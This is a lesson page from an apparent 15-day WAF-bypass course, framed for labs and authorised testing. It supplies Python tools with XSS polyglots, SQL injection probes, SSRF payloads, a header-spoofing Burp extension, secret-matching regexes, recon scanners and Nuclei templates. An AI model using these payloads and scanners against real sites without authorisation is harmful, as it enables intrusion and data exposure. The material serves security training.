# 🛠️ Day 12 — Advanced Polyglots, Custom Tooling & Automation

> **Part of:** 15-Day WAF Bypass & Payload Crafting Mastery — Week 3  
> **Date:** Tuesday, April 28, 2026  
> **Difficulty:** ⭐⭐⭐⭐⭐ Expert — Tool Creator  
> **Time Required:** 7–8 hours  
> **Focus:** Build a personal, ethical, lab-safe security testing toolkit  

![Day](https://img.shields.io/badge/Day-12%2F15-purple)
![Status](https://img.shields.io/badge/Status-Tool%20Creator-red)
![Focus](https://img.shields.io/badge/Focus-Custom%20Arsenal-critical)
![Level](https://img.shields.io/badge/Level-Automation-gold)

> ⚠️ **Ethical Use Only:**  
> This document is for private labs, CTFs, PortSwigger Academy, intentionally vulnerable environments, authorized bug bounty programs, and approved penetration testing only.  
> Do not test, scan, exploit, or automate against systems without explicit permission.

---

## 📑 Table of Contents

- [🛠️ Why Build Your Own Tools?](#️-why-build-your-own-tools)
- [🎯 Objectives](#-objectives)
- [⏰ Time Breakdown](#-time-breakdown)
- [🧬 Session 1: Advanced Polyglot Engineering](#-session-1-advanced-polyglot-engineering)
- [🐍 Session 2: Python Automation Arsenal](#-session-2-python-automation-arsenal)
- [📝 Session 3: Custom Wordlists & Fuzzing](#-session-3-custom-wordlists--fuzzing)
- [🔌 Session 4: Burp Extension Development](#-session-4-burp-extension-development)
- [🎯 Session 5: Nuclei Template Mastery](#-session-5-nuclei-template-mastery)
- [🚀 Session 6: Build Your Full Recon Pipeline](#-session-6-build-your-full-recon-pipeline)
- [🔗 Session 7: Integration & Final Toolkit](#-session-7-integration--final-toolkit)
- [🔁 Micro-Habits Continuation](#-micro-habits-continuation)
- [🏆 Day 12 Challenge](#-day-12-challenge)
- [📋 Master Cheat Sheets](#-master-cheat-sheets)
- [📚 Resources](#-resources)
- [❓ Self-Check Questions](#-self-check-questions)
- [🚀 What’s Next?](#-whats-next)
- [📝 My Day 12 Notes](#-my-day-12-notes)
- [🚀 Commit Workflow](#-commit-workflow)
- [🎯 Key Actions for Today](#-key-actions-for-today)
- [💡 Pro Tips](#-pro-tips)

---

# 🛠️ Why Build Your Own Tools?

```text
┌─────────────────────────────────────────────────────┐
│  HUNTER TOOL EVOLUTION                              │
├─────────────────────────────────────────────────────┤
│  Level 1: Uses default tools                        │
│    → sqlmap, nuclei, Burp Suite                     │
│                                                     │
│  Level 2: Uses tools with custom configs            │
│    → custom nuclei templates, Burp rules            │
│                                                     │
│  Level 3: Modifies existing tools                   │
│    → forks popular tools, adds features             │
│                                                     │
│  Level 4: Writes personal tools                     │
│    → original Python scripts, custom workflows      │
│                                                     │
│  Level 5: Publishes tools others use                │
│    → open-source contribution and reputation        │
└─────────────────────────────────────────────────────┘
```

## Why Elite Hunters Build Custom Tools

| Benefit | Impact |
|---|---|
| Unique detection | Find bugs others may miss |
| Faster iteration | Test safe payloads and workflows quickly |
| Target-specific logic | Tune checks to one authorized target |
| Better documentation | Repeatable workflow and clean evidence |
| Personal brand | Public tools build credibility |

---

# 🎯 Objectives

By the end of Day 12, I will be able to:

- [ ] Engineer polyglot payloads for lab-safe multi-context testing
- [ ] Build Python tools for recon, analysis, and workflow automation
- [ ] Create custom wordlists from target content
- [ ] Write a basic Burp extension
- [ ] Create Nuclei templates for custom detection
- [ ] Chain tools into a repeatable recon pipeline
- [ ] Publish tools to GitHub with clean documentation
- [ ] Automate a full hunting workflow with one command

---

# ⏰ Time Breakdown

| Session | Topic | Duration |
|---|---|---:|
| 1 | Advanced Polyglot Engineering | 90 min |
| 2 | Python Automation Arsenal | 90 min |
| 3 | Custom Wordlists & Fuzzing | 60 min |
| 4 | Burp Extension Development | 75 min |
| 5 | Nuclei Template Mastery | 60 min |
| 6 | Build Full Recon Pipeline | 75 min |
| 7 | Integration & Final Toolkit | 60 min |
| **Total** |  | **~8 hours** |

---

# 🧬 Session 1: Advanced Polyglot Engineering

## What Is a Polyglot?

A polyglot is a payload designed to work in more than one parsing context.

```text
One input
   ↓
Multiple possible contexts
   ↓
HTML / Attribute / URL / JavaScript / JSON
```

> Goal: understand parser behavior in a controlled lab, not blindly paste payloads into real targets.

---

## Polyglot Anatomy

Example educational polyglot structure:

```text
URL scheme
  + comment escape
  + attribute breakout
  + tag breakout
  + event handler
  + fallback tag
```

| Component | Purpose | Context |
|---|---|---|
| URL scheme | Tests URL/href interpretation | URL context |
| Comment escapes | Tests JavaScript parser behavior | JS string/template |
| Attribute breakout | Tests HTML attribute context | Attribute |
| Tag breakout | Closes parent tags safely in labs | HTML |
| Event handler | Confirms execution in lab | HTML |
| Fallback tag | Tests browser parsing behavior | Mixed |

---

## Tool 1: `polyglot_builder.py`

Save as:

```text
~/waf-lab/scripts/polyglot_builder.py
```

```python
#!/usr/bin/env python3
"""
Advanced Polyglot Builder — Day 12

Generates lab-safe polyglot payload variants for controlled testing.
Use only in private labs, CTFs, PortSwigger labs, or authorized scopes.
"""

import argparse
import html
from urllib.parse import quote


BLOCKS = {
    "url_scheme": [
        "javascript:",
        "jaVaScRiPt:",
        "java%09script:",
    ],
    "comment_escapes": [
        "/**/",
        "//",
        "-->",
    ],
    "tag_breakouts": [
        "</script>",
        "</style>",
        "</title>",
        "</textarea>",
    ],
    "attribute_breakouts": [
        '"',
        "'",
        '">',
        "'>",
    ],
    "payload_tags": [
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
}


def build_universal_polyglot() -> str:
    """Build a simple universal lab polyglot."""
    parts = [
        "jaVasCript:",
        "/**/",
        '"',
        ">",
        "</script>",
        "<svg/onload=alert(1)>",
    ]
    return "".join(parts)


def build_custom_polyglot(contexts: list[str]) -> str:
    """Build a polyglot based on specified contexts."""
    result: list[str] = []

    if "url" in contexts:
        result.append(BLOCKS["url_scheme"][0])

    if "js" in contexts:
        result.extend(BLOCKS["comment_escapes"][:2])

    if "attr" in contexts:
        result.append(BLOCKS["attribute_breakouts"][0])

    if "tag" in contexts:
        result.extend(BLOCKS["tag_breakouts"][:2])

    result.append(BLOCKS["payload_tags"][0])
    return "".join(result)


def generate_variations(base_payload: str) -> list[str]:
    """Generate safe encoding/case variations."""
    return [
        base_payload,
        quote(base_payload),
        quote(quote(base_payload)),
        html.escape(base_payload),
        "".join(f"&#{ord(char)};" for char in base_payload),
        "".join(f"&#x{ord(char):x};" for char in base_payload),
        base_payload.upper(),
        "".join(char.upper() if index % 2 else char for index, char in enumerate(base_payload)),
    ]


def main() -> None:
    parser = argparse.ArgumentParser(description="Lab-safe polyglot builder")
    parser.add_argument(
        "--mode",
        choices=["universal", "custom", "variations"],
        default="universal",
    )
    parser.add_argument(
        "--contexts",
        nargs="+",
        choices=["url", "js", "attr", "tag"],
        help="Target contexts for custom mode",
    )
    parser.add_argument("--output", help="Output file")

    args = parser.parse_args()

    if args.mode == "universal":
        payload = build_universal_polyglot()
        print(f"\nUniversal Polyglot:\n{payload}\n")

    elif args.mode == "custom":
        if not args.contexts:
            raise SystemExit("[!] --contexts is required for custom mode")

        payload = build_custom_polyglot(args.contexts)
        print(f"\nCustom Polyglot ({', '.join(args.contexts)}):\n{payload}\n")

    else:
        base_payload = build_universal_polyglot()
        variations = generate_variations(base_payload)

        print(f"\n{len(variations)} Polyglot Variations:\n")
        for index, variation in enumerate(variations, 1):
            print(f"[{index}] {variation}\n")

        if args.output:
            with open(args.output, "w", encoding="utf-8") as file:
                for variation in variations:
                    file.write(variation + "\n")
            print(f"[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
```

### Usage

```bash
python3 polyglot_builder.py --mode universal
python3 polyglot_builder.py --mode custom --contexts js url attr
python3 polyglot_builder.py --mode variations --output polyglots.txt
```

---

## Tool 2: `sqli_polyglot.py`

Save as:

```text
~/waf-lab/scripts/sqli_polyglot.py
```

```python
#!/usr/bin/env python3
"""
SQLi Polyglot Reference — Day 12

Detection-focused SQLi payload reference for labs and authorized testing.
Avoid destructive payloads. Confirm only with safe proof.
"""

SQLI_POLYGLOTS = [
    # Basic quote probes
    "'",
    '"',
    "`",

    # Boolean-style probes
    "' OR '1'='1'-- -",
    '" OR "1"="1"-- -',
    "1 OR 1=1-- -",

    # Comment and whitespace variations
    "'/**/OR/**/'1'='1'-- -",
    "' OR '1'='1'#",

    # Time-based detection examples for controlled labs only
    "' AND SLEEP(3)-- -",
    "'; SELECT pg_sleep(3)-- -",
    "'; WAITFOR DELAY '0:0:3'-- -",

    # Union-style structure probes
    "1' UNION SELECT NULL-- -",
    "1' UNION SELECT NULL,NULL-- -",
    "1' UNION SELECT NULL,NULL,NULL-- -",

    # WAF parsing study examples
    "/*!50000UNION*/ /*!50000SELECT*/ NULL",
    "1/**/AND/**/1=1-- -",
]


def main() -> None:
    print("\n=== SQLi Detection Payloads — Lab / Authorized Use Only ===\n")

    for index, payload in enumerate(SQLI_POLYGLOTS, 1):
        print(f"[{index:02}] {payload}")


if __name__ == "__main__":
    main()
```

---

# 🐍 Session 2: Python Automation Arsenal

## Tool 3: `param_fuzz.py`

Save as:

```text
~/waf-lab/scripts/param_fuzz.py
```

```python
#!/usr/bin/env python3
"""
Smart Parameter Fuzzer — Day 12

Tests parameters with small, controlled payload sets.
Use only on labs or explicitly authorized targets.
"""

import argparse
import concurrent.futures
from dataclasses import dataclass

import requests
from urllib3 import disable_warnings

disable_warnings()


XSS_PAYLOADS = [
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    '" autofocus onfocus=alert(1) x="',
    "<details open ontoggle=alert(1)>",
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1'-- -",
    "' AND SLEEP(3)-- -",
    "1' UNION SELECT NULL-- -",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://example.com/",
]


@dataclass
class FuzzResult:
    payload: str
    status: int | str
    reflected: bool
    size_diff: int
    waf_block: bool
    error: str | None = None


def test_payload(url: str, param: str, payload: str, baseline_length: int) -> FuzzResult:
    """Test a single payload and detect simple anomalies."""
    try:
        response = requests.get(
            url,
            params={param: payload},
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        return FuzzResult(
            payload=payload,
            status=response.status_code,
            reflected=payload in response.text,
            size_diff=abs(len(response.text) - baseline_length),
            waf_block=response.status_code in {403, 406, 501},
        )

    except requests.RequestException as error:
        return FuzzResult(
            payload=payload,
            status="ERR",
            reflected=False,
            size_diff=0,
            waf_block=False,
            error=str(error),
        )


def fuzz_parameter(url: str, param: str, payload_set: str, threads: int) -> None:
    """Fuzz a single parameter."""
    payloads = {
        "xss": XSS_PAYLOADS,
        "sqli": SQLI_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
    }[payload_set]

    print(f"\n[*] Fuzzing {url}?{param}= with {payload_set.upper()} payloads")

    try:
        baseline = requests.get(url, params={param: "test"}, timeout=10, verify=False)
        baseline_length = len(baseline.text)
    except requests.RequestException:
        baseline_length = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(test_payload, url, param, payload, baseline_length)
            for payload in payloads
        ]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            icon = "🚨" if result.reflected else "❌" if result.waf_block else "✅"

            print(
                f"{icon} [{result.status}] "
                f"{result.payload[:60]:60} "
                f"diff={result.size_diff}"
            )


def main() -> None:
    parser = argparse.ArgumentParser(description="Smart parameter fuzzer")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-p", "--param", required=True)
    parser.add_argument("-t", "--type", choices=["xss", "sqli", "ssrf"], default="xss")
    parser.add_argument("--threads", type=int, default=5)

    args = parser.parse_args()
    fuzz_parameter(args.url, args.param, args.type, args.threads)


if __name__ == "__main__":
    main()
```

### Usage

```bash
python3 param_fuzz.py -u https://target.com/search -p q -t xss
python3 param_fuzz.py -u https://target.com/user -p id -t sqli
python3 param_fuzz.py -u https://target.com/fetch -p url -t ssrf
```

---

## Tool 4: `js_endpoint_extract.py`

Save as:

```text
~/waf-lab/scripts/js_endpoint_extract.py
```

```python
#!/usr/bin/env python3
"""
JavaScript Endpoint Extractor — Day 12

Extracts API endpoints, URLs, suspicious sinks, and secret-like patterns from JS files.
"""

import argparse
import concurrent.futures
import json
import re
from urllib.parse import urljoin

import requests
from urllib3 import disable_warnings

disable_warnings()


PATTERNS = {
    "endpoints": [
        r'["\'](/api/[a-zA-Z0-9_/\-?=&.]+)["\']',
        r'["\'](/v\d+/[a-zA-Z0-9_/\-?=&.]+)["\']',
        r'["\']/(user|admin|account|profile|data)/[a-zA-Z0-9_/\-?=&.]+["\']',
    ],
    "secrets": [
        r"AIza[0-9A-Za-z\-_]{35}",
        r"AKIA[0-9A-Z]{16}",
        r"sk_live_[0-9a-zA-Z]{24}",
        r"eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
        r"github_pat_[a-zA-Z0-9_]{82}",
        r"glpat-[a-zA-Z0-9_\-]{20}",
        r"xox[baprs]-[a-zA-Z0-9\-]+",
    ],
    "urls": [
        r"https?://[a-zA-Z0-9.\-]+(?:/[^\s\"'<>]*)?",
    ],
    "suspicious_sinks": [
        r"eval\s*\(",
        r"innerHTML\s*=",
        r"document\.write\s*\(",
        r"dangerouslySetInnerHTML",
    ],
}


def fetch_url(url: str) -> str:
    try:
        response = requests.get(url, timeout=10, verify=False)
        return response.text
    except requests.RequestException:
        return ""


def find_js_urls(html: str, base_url: str) -> list[str]:
    js_paths = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html)
    return sorted({urljoin(base_url, path) for path in js_paths})


def analyze_js(content: str) -> dict[str, list[str]]:
    findings: dict[str, list[str]] = {}

    for category, patterns in PATTERNS.items():
        matches: list[str] = []

        for pattern in patterns:
            for match in re.findall(pattern, content):
                if isinstance(match, tuple):
                    match = "/".join(part for part in match if part)
                matches.append(str(match))

        findings[category] = sorted(set(matches))

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Extract endpoints and secrets from JS")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output JSON file")

    args = parser.parse_args()

    print(f"[*] Fetching {args.url}")
    html = fetch_url(args.url)

    js_urls = find_js_urls(html, args.url)
    print(f"[+] Found {len(js_urls)} JS files")

    all_findings: dict[str, dict[str, list[str]]] = {}

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_map = {executor.submit(fetch_url, js_url): js_url for js_url in js_urls}

        for future in concurrent.futures.as_completed(future_map):
            js_url = future_map[future]
            content = future.result()

            if not content:
                continue

            findings = analyze_js(content)

            if any(findings.values()):
                all_findings[js_url] = findings

    print("\n" + "=" * 70)
    print("FINDINGS")
    print("=" * 70)

    for url, findings in all_findings.items():
        print(f"\n📄 {url}")

        for category, items in findings.items():
            if not items:
                continue

            print(f"  [{category}] {len(items)} matches")
            for item in items[:5]:
                print(f"    → {item[:120]}")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as file:
            json.dump(all_findings, file, indent=2)

        print(f"\n[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
```

### Usage

```bash
python3 js_endpoint_extract.py -u https://target.com -o findings.json
```

---

## Tool 5: `multi_scan.py`

Save as:

```text
~/waf-lab/scripts/multi_scan.py
```

```python
#!/usr/bin/env python3
"""
Multi-Target Parallel Scanner — Day 12

Runs lightweight checks across multiple authorized targets.
"""

import argparse
import concurrent.futures
import json

import requests
from urllib3 import disable_warnings

disable_warnings()


def scan_target(url: str) -> dict:
    findings = {
        "url": url,
        "issues": [],
    }

    try:
        response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        body = response.text.lower()
        headers = {key.lower(): value for key, value in response.headers.items()}

        findings["status"] = response.status_code
        findings["server"] = headers.get("server", "")

        if "cf-ray" in headers or "akamai" in str(headers).lower():
            findings["issues"].append("waf_or_cdn_detected")

        if "debug" in body or "traceback" in body:
            findings["issues"].append("debug_or_traceback_text")

        if "graphql" in body:
            findings["issues"].append("graphql_reference")

        if headers.get("access-control-allow-origin") == "*":
            findings["issues"].append("wildcard_cors")

    except requests.RequestException as error:
        findings["error"] = str(error)

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Parallel target scanner")
    parser.add_argument("-l", "--list", required=True, help="Target list file")
    parser.add_argument("-t", "--threads", type=int, default=20)
    parser.add_argument("-o", "--output", help="Output JSON file")

    args = parser.parse_args()

    with open(args.list, encoding="utf-8") as file:
        targets = [line.strip() for line in file if line.strip()]

    print(f"[*] Scanning {len(targets)} targets with {args.threads} threads")

    results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(scan_target, target) for target in targets]

        for index, future in enumerate(concurrent.futures.as_completed(futures), 1):
            result = future.result()
            results.append(result)

            if result.get("issues"):
                print(f"[{index}/{len(targets)}] 🚨 {result['url']}")
                for issue in result["issues"]:
                    print(f"  └─ {issue}")
            else:
                print(f"[{index}/{len(targets)}] ✅ {result['url']}")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as file:
            json.dump(results, file, indent=2)

        print(f"\n[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
```

### Usage

```bash
cat > targets.txt << 'EOF'
https://example.com
https://example.org
EOF

python3 multi_scan.py -l targets.txt -o scan-results.json
```

---

## Tool 6: `bypass_matrix.py`

Save as:

```text
~/waf-lab/scripts/bypass_matrix.py
```

```python
#!/usr/bin/env python3
"""
WAF Lab Matrix Tester — Day 12

Tests lab-safe XSS payloads across local WAF paranoia levels.
Designed for the Day 5 local lab only.
"""

import requests


LAB_TARGETS = {
    "PL1": "http://localhost:9001",
    "PL2": "http://localhost:9002",
    "PL3": "http://localhost:9003",
    "PL4": "http://localhost:9004",
}


PAYLOADS = [
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
]


def test_payload(url: str, payload: str) -> int | str:
    try:
        response = requests.get(url, params={"q": payload}, timeout=5)
        return response.status_code
    except requests.RequestException:
        return "ERR"


def main() -> None:
    print(f"\n{'Payload':<65} | PL1 | PL2 | PL3 | PL4")
    print("-" * 95)

    for payload in PAYLOADS:
        row = []

        for _, url in LAB_TARGETS.items():
            status = test_payload(url, payload)
            icon = "✅" if status == 200 else "❌" if status == 403 else "⚠️"
            row.append(f"{icon}{status}")

        display = payload[:62] + "..." if len(payload) > 65 else payload
        print(f"{display:<65} | {' | '.join(row)}")


if __name__ == "__main__":
    main()
```

---

## Tool 7: `target_checker.py`

Save as:

```text
~/waf-lab/scripts/target_checker.py
```

```python
#!/usr/bin/env python3
"""
Instant Target Checker — Day 12

Quickly evaluates a target for visible tech, WAF hints, and common discovery paths.
Use only on assets where testing is allowed.
"""

import socket
import sys
from urllib.parse import urlparse

import requests
from urllib3 import disable_warnings

disable_warnings()


COMMON_PATHS = [
    "/robots.txt",
    "/sitemap.xml",
    "/graphql",
    "/api",
    "/admin",
    "/swagger",
    "/api-docs",
]


def evaluate_target(url: str) -> None:
    parsed = urlparse(url)
    domain = parsed.hostname

    if not domain:
        raise SystemExit("[!] Invalid URL")

    print(f"\n🎯 Evaluating: {url}")
    print("=" * 60)

    try:
        ip_address = socket.gethostbyname(domain)
        print(f"📍 IP: {ip_address}")
    except socket.gaierror:
        print("📍 IP: Could not resolve")
        return

    try:
        response = requests.get(url, timeout=10, verify=False)

        print(f"🖥️  Server: {response.headers.get('server', 'unknown')}")
        print(f"⚡ Powered-By: {response.headers.get('x-powered-by', 'unknown')}")

        waf_indicators = ["cloudflare", "akamai", "cloudfront", "incap", "sucuri"]
        detected_waf = [
            item for item in waf_indicators if item in str(response.headers).lower()
        ]

        if detected_waf:
            print(f"🛡️  WAF/CDN: {', '.join(detected_waf)}")
        else:
            print("🛡️  WAF/CDN: None obvious")

        print("\n🔍 Common Path Checks")

        for path in COMMON_PATHS:
            try:
                path_response = requests.get(
                    f"{url.rstrip('/')}{path}",
                    timeout=5,
                    verify=False,
                    allow_redirects=False,
                )

                if path_response.status_code in {200, 301, 302, 403}:
                    print(f"  [{path_response.status_code}] {path}")

            except requests.RequestException:
                continue

        score = 0
        body = response.text.lower()

        if detected_waf:
            score += 1
        if "api" in body:
            score += 2
        if "admin" in body:
            score += 1

        print("\n💰 Quick Interest Rating")
        print(f"  Score: {score}/10")

        if score >= 3:
            print("  ✅ Worth deeper review")
        else:
            print("  ⚠️ Low initial signal")

    except requests.RequestException as error:
        print(f"❌ Error: {error}")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    evaluate_target(target)
```

---

# 📝 Session 3: Custom Wordlists & Fuzzing

## Why Custom Wordlists Matter

```text
Default wordlists find default bugs.
Custom wordlists find target-specific paths.
```

---

## Wordlist Sources

```bash
git clone https://github.com/danielmiessler/SecLists ~/SecLists
git clone https://github.com/six2dez/OneListForAll
```

Useful sources:

- SecLists
- Assetnote wordlists
- OneListForAll
- Commonspeak2
- Target’s own JavaScript files
- Target’s sitemap
- Wayback URLs

---

## Build a Target-Specific Wordlist

### From Target JavaScript / HTML

```bash
curl -s https://target.com \
  | grep -oE "['\"][a-zA-Z0-9_/-]{3,30}['\"]" \
  | tr -d "'\"" \
  | sort -u > target-words.txt
```

### From Sitemap

```bash
curl -s https://target.com/sitemap.xml \
  | grep -oE "<loc>[^<]+</loc>" \
  | sed 's/<loc>//; s#</loc>##' \
  | awk -F/ '{for(i=1;i<=NF;i++) print $i}' \
  | sort -u > target-paths.txt
```

### From Wayback Machine

```bash
waybackurls target.com \
  | awk -F/ '{for(i=4;i<=NF;i++) print $i}' \
  | awk -F'?' '{print $1}' \
  | sort -u > target-historical.txt
```

### Combine

```bash
cat target-words.txt target-paths.txt target-historical.txt \
  | sort -u > target-custom-wordlist.txt
```

---

## Tool 8: `wordlist_gen.py`

Save as:

```text
~/waf-lab/scripts/wordlist_gen.py
```

```python
#!/usr/bin/env python3
"""
Target-Specific Wordlist Generator — Day 12
"""

import argparse
import re
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup
from urllib3 import disable_warnings

disable_warnings()


def extract_words_from_html(html: str) -> set[str]:
    words: set[str] = set()
    soup = BeautifulSoup(html, "html.parser")

    for tag in soup.find_all(["a", "link", "script", "img", "form"]):
        for attr in ["href", "src", "action"]:
            value = tag.get(attr, "")

            for part in re.split(r"[/?&=#._-]", value):
                if 3 <= len(part) <= 30 and part.isalnum():
                    words.add(part.lower())

    text_words = re.findall(r"\b[a-z]{4,15}\b", html.lower())
    words.update(text_words)

    js_strings = re.findall(r"[\"']([a-zA-Z0-9_]{3,30})[\"']", html)
    words.update(item.lower() for item in js_strings)

    comments = re.findall(r"<!--(.*?)-->", html, re.DOTALL)
    for comment in comments:
        words.update(
            item.lower()
            for item in re.findall(r"\b[a-zA-Z0-9_]{3,30}\b", comment)
        )

    return words


def generate_wordlist(url: str, depth: int) -> list[str]:
    words: set[str] = set()
    visited: set[str] = set()
    to_visit = [url]

    base_host = urlparse(url).hostname

    for _ in range(depth):
        current_batch = list(to_visit)
        to_visit = []

        for link in current_batch:
            if link in visited:
                continue

            visited.add(link)

            try:
                response = requests.get(link, timeout=10, verify=False)
                words.update(extract_words_from_html(response.text))

                soup = BeautifulSoup(response.text, "html.parser")

                for anchor in soup.find_all("a", href=True):
                    new_link = urljoin(url, anchor["href"])

                    if urlparse(new_link).hostname == base_host:
                        to_visit.append(new_link)

            except requests.RequestException:
                continue

    return sorted(words)


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate target-specific wordlist")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-d", "--depth", type=int, default=1)
    parser.add_argument("-o", "--output", default="wordlist.txt")
    parser.add_argument("--min-len", type=int, default=3)
    parser.add_argument("--max-len", type=int, default=30)

    args = parser.parse_args()

    print(f"[*] Generating wordlist from {args.url} with depth={args.depth}")

    words = generate_wordlist(args.url, args.depth)
    words = [
        word for word in words
        if args.min_len <= len(word) <= args.max_len
    ]

    with open(args.output, "w", encoding="utf-8") as file:
        for word in words:
            file.write(word + "\n")

    print(f"[+] Generated {len(words)} words → {args.output}")


if __name__ == "__main__":
    main()
```

### Usage

```bash
pip install beautifulsoup4
python3 wordlist_gen.py -u https://target.com -d 2 -o custom-wordlist.txt
ffuf -w custom-wordlist.txt -u https://target.com/FUZZ
```

---

## Fuzzing Strategies

```bash
# Content discovery
ffuf -w custom-wordlist.txt \
  -u https://target.com/FUZZ \
  -mc 200,301,302,403 \
  -ac \
  -o results.json

# Parameter discovery
ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -u https://target.com/?FUZZ=test \
  -fs 1234

# Recursive discovery
ffuf -w custom-wordlist.txt \
  -u https://target.com/FUZZ \
  -recursion \
  -recursion-depth 2
```

---

# 🔌 Session 4: Burp Extension Development

## Why Write Burp Extensions?

Burp extensions help you:

- Automate repeated checks
- Highlight interesting responses
- Add custom headers
- Reduce manual work
- Build your own workflow advantage

---

## Extension Options

| Type | Language | Difficulty |
|---|---|---|
| Jython | Python 2 | Easy |
| Montoya API | Java / Kotlin | Medium |
| Java | Java | Hard |

---

## Extension 1: `xss_detector.py`

Save as:

```text
~/waf-lab/burp-extensions/xss_detector.py
```

```python
"""
XSS Detector — Burp Suite Jython Extension

Auto-prints reflected parameter values and basic XSS indicators.
For lab and authorized testing only.
"""

from burp import IBurpExtender, IProxyListener
from java.io import PrintWriter


class BurpExtender(IBurpExtender, IProxyListener):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("XSS Detector")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stdout.println("[+] XSS Detector loaded")

        callbacks.registerProxyListener(self)

    def processProxyMessage(self, messageIsRequest, message):
        if messageIsRequest:
            return

        info = message.getMessageInfo()
        response = info.getResponse()

        if not response:
            return

        response_text = self._helpers.bytesToString(response)
        request = info.getRequest()
        request_info = self._helpers.analyzeRequest(request)
        params = request_info.getParameters()
        url = request_info.getUrl().toString()

        for param in params:
            value = param.getValue()

            if len(value) <= 3:
                continue

            if value in response_text:
                indicators = ["<script", "<svg", "onerror", "onload", "javascript:"]
                context_found = any(
                    indicator in response_text.lower()
                    for indicator in indicators
                )

                if context_found:
                    self.stdout.println("[!!] POTENTIAL XSS REFLECTION")
                    self.stdout.println("    URL: " + url)
                    self.stdout.println("    Param: " + param.getName())
                    self.stdout.println("    Value: " + value[:80])
```

### Install

```text
1. Download Jython Standalone JAR 2.7.x.
2. Burp Suite → Extensions → Options → Python Environment.
3. Select the Jython JAR.
4. Extensions → Add.
5. Type: Python.
6. File: xss_detector.py.
7. Load.
```

---

## Extension 2: `auto_bypass.py`

Save as:

```text
~/waf-lab/burp-extensions/auto_bypass.py
```

```python
"""
Auto Header Helper — Burp Suite Jython Extension

Adds common proxy-related headers for lab testing.
Use only in controlled labs or authorized scopes.
"""

from burp import IBurpExtender, IHttpListener


HEADERS_TO_ADD = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "X-Client-IP": "127.0.0.1",
}


class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Auto Header Helper")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return

        request = messageInfo.getRequest()
        request_info = self._helpers.analyzeRequest(request)

        headers = list(request_info.getHeaders())
        body = request[request_info.getBodyOffset():]

        for name, value in HEADERS_TO_ADD.items():
            if not any(header.lower().startswith(name.lower() + ":") for header in headers):
                headers.append(name + ": " + value)

        new_request = self._helpers.buildHttpMessage(headers, body)
        messageInfo.setRequest(new_request)
```

---

# 🎯 Session 5: Nuclei Template Mastery

## Why Nuclei?

Nuclei is a template-driven scanner for known issues, misconfigurations, exposures, and custom checks.

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates
nuclei -u https://target.com -severity medium,high,critical
```

---

## Custom Template 1: `custom-reflected-xss.yaml`

Save as:

```text
~/waf-lab/nuclei-templates/custom-reflected-xss.yaml
```

```yaml
id: custom-reflected-xss

info:
  name: Custom Reflected XSS Detection
  author: yourname
  severity: medium
  description: Tests common reflected XSS locations with lab-safe payloads.
  tags: xss,reflected,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q={{payload}}"
      - "{{BaseURL}}/?q={{payload}}"
      - "{{BaseURL}}/?search={{payload}}"

    payloads:
      payload:
        - "%3Csvg%2Fonload%3Dalert%281%29%3E"
        - "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<svg"
          - "onload="
        condition: and

      - type: status
        status:
          - 200
```

### Run

```bash
nuclei -t custom-reflected-xss.yaml -u https://target.com
```

---

## Custom Template 2: `common-debug-exposure.yaml`

Save as:

```text
~/waf-lab/nuclei-templates/common-debug-exposure.yaml
```

```yaml
id: common-debug-exposure

info:
  name: Common Debug Endpoint Exposure
  author: yourname
  severity: info
  description: Checks for common debug or documentation endpoints.
  tags: debug,exposure,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/status"
      - "{{BaseURL}}/health"
      - "{{BaseURL}}/api-docs"
      - "{{BaseURL}}/swagger"

    matchers:
      - type: status
        status:
          - 200
          - 403
```

---

